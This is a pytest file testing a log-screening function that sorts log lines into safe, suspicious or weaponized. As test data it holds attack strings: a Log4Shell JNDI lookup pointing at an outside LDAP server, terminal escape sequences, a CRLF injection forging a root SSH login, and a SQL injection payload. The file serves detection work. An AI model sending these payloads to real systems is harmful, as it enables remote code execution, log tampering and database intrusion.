import pytest

from app.services.security.shield import screen_line

SAFE_LINES = [
    "Sep  2 08:14:02 web-01 sshd[20413]: Accepted password for jdoe from 10.20.0.14 port 51522 ssh2",
    '10.20.0.14 - - [02/Sep/2025:08:15:03 +0000] "GET /dashboard HTTP/1.1" 200 5321 "-" "Mozilla/5.0"',
    '{"ts":"2025-09-02T09:02:12Z","level":"info","event":"login_success","user":"jdoe"}',
    "date=2025-09-02 time=09:01:50 devname=fw-dc-01 action=deny srcip=192.168.1.50 dstip=10.20.0.20",
]


@pytest.mark.parametrize("line", SAFE_LINES)
def test_benign_lines_are_safe(line):
    v = screen_line(line)
    assert v.verdict == "SAFE", v.indicators


def test_log4shell_is_weaponized():
    v = screen_line("user=admin ${jndi:ldap://198.51.100.9:1389/Exploit} ok")
    assert v.verdict == "WEAPONIZED_LOG"
    assert v.quarantine is True
    assert any(i["type"] == "log4shell" for i in v.indicators)


def test_real_control_bytes_flagged():
    v = screen_line("normal text \x00\x07 more text \x1b[31mred\x1b[0m")
    assert v.verdict in ("SUSPICIOUS", "WEAPONIZED_LOG")
    types = {i["type"] for i in v.indicators}
    assert "dangerous_control_chars" in types or "terminal_escape_sequence" in types
    assert v.quarantine is True


def test_literal_escape_sequence_flagged():
    v = screen_line(r"banner=hello\x1b]0;pwned\x07 done")
    assert v.verdict in ("SUSPICIOUS", "WEAPONIZED_LOG")
    assert any(i["type"] == "literal_escape_seq" for i in v.indicators)


def test_crlf_log_forging_is_injection_and_quarantined():
    v = screen_line(r'note="x\r\nSep  2 09:10:04 web-01 sshd[9]: Accepted password for root from 10.0.0.1 port 22 ssh2"')
    assert v.verdict in ("SUSPICIOUS", "WEAPONIZED_LOG")
    assert v.quarantine is True
    assert any(i["type"] == "crlf_injection" for i in v.indicators)


def test_recorded_sqli_payload_is_flagged_but_not_quarantined():
    v = screen_line('args: search="1\' OR 1=1;-- " results=all')
    assert v.verdict == "SUSPICIOUS"
    assert v.quarantine is False  # the log is legitimate; it just records an attack
    assert any(i["type"] == "sql_injection" for i in v.indicators)
    assert all(i["category"] == "payload" for i in v.indicators)


def test_snippets_are_rendered_safely():
    v = screen_line("x \x1b[31m ${jndi:ldap://a/b}")
    for i in v.indicators:
        assert "\x1b" not in i["detail"]
